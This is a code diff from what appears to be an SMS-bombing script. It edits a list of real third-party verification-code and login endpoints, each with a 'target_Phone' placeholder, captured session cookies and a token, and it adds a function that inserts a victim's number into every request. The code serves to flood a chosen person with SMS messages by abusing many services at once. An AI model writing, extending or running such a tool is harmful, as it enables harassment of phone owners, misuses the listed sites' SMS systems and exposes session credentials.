@@ -37,12 +37,11 @@ api_list = [
         }
     },
     {
-        "url": "http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=target_Phone&mbid=197873&check=3",
-        "type": "GET",
-        "cookie": "PHPSESSID=q8h78o91qm30m5bl7lufkt3go3; jrh_visit_log=q8h78o91qm30m5bl7lufkt3go3; Hm_lvt_b627bb080fd97f01181b26820034cfcb=1580999339; UM_distinctid=1701ae772688ac-09ae1bde44e676-6701b35-144000-1701ae772699ca; CNZZDATA1276814029=219078261-1580999135-%7C1580999135; Hm_lpvt_b627bb080fd97f01181b26820034cfcb=1580999403"
+        "url": "https://developer.i4.cn/put/getMsgCode.xhtml?_=1580912157461&phoneNumber=target_Phone&codeType=6",
+        "type": "GET"
     },
     {
-        "url": "https://developer.i4.cn/put/getMsgCode.xhtml?_=1580912157461&phoneNumber=target_Phone&codeType=6",
+        "url": "http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=target_Phone&mbid=197858&check=3",
         "type": "GET"
     },
     {
@@ -57,7 +56,7 @@ api_list = [
             "method": "sms",
             "mobile": "target_Phone",
             "uname": "target_Phone",
-            "token": "",
+            "token": "eab0ca1547c3051d7c06330ae018c3d8",
         },
         "headers": {
             "cookie": "ASP.NET_SessionId=1zpetajacprst1vvgvtqvt2u; pcstatpageusersign=1lzva83zoqa3qpid3ukvojnye9xgq0th; UM_distinctid=1701a43b89b44b-0e920e8853ac59-6701b35-144000-1701a43b89c9d1; CNZZDATA1275068799=1423156539-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; CNZZDATA1275068004=1203802890-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; __qc_wId=999; pgv_pvid=1596346520; xxcpoint=GU3TIZJYHE3DOZJTGAZTKOJUGJSGIOJWG5SWCMDDGA4DANJZGJRA",
@@ -87,24 +86,22 @@ api_list = [
             "data": ""
         }
     },
-    {
-        "url": "http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",
-        "type": "POST",
-        "parm": {
-            "MOBILENO": "target_Phone",
-            "TEMP": "1"
-        },
-        "cookie": "qcdzh-session-id=fe77ec80-efb8-4238-844e-c0e136b349de; UM_distinctid=1701adce0071-069b6727280a07-6701b35-144000-1701adce00891c; CNZZDATA1274944014=862482110-1580998603-http%253A%252F%252Fqydj.scjg.tj.gov.cn%252F%7C1580998603"
-    },
 ]
 
+def replacePhoneDFS(api_dict, phone):
+    for key in api_dict:
+        if isinstance(api_dict[key], dict):
+            api_dict[key] = replacePhoneDFS(api_dict[key], phone)
+        elif isinstance(api_dict[key], str):
+            api_dict[key] = api_dict[key].replace("target_Phone", phone)
+        elif isinstance(api_dict[key], list):
+            api_dict[key] = [replacePhoneDFS(i, phone) for i in api_dict[key] if isinstance(i, dict)]
+    return api_dict
 
 def replacePhone(phone):
     target_list = []
     for api in api_list:
-        api_str = json.dumps(api)
-        api_str = api_str.replace("target_Phone", phone)
-        target_list.append(json.loads(api_str))
+        target_list.append(replacePhoneDFS(api, phone))
     return target_list
 
 
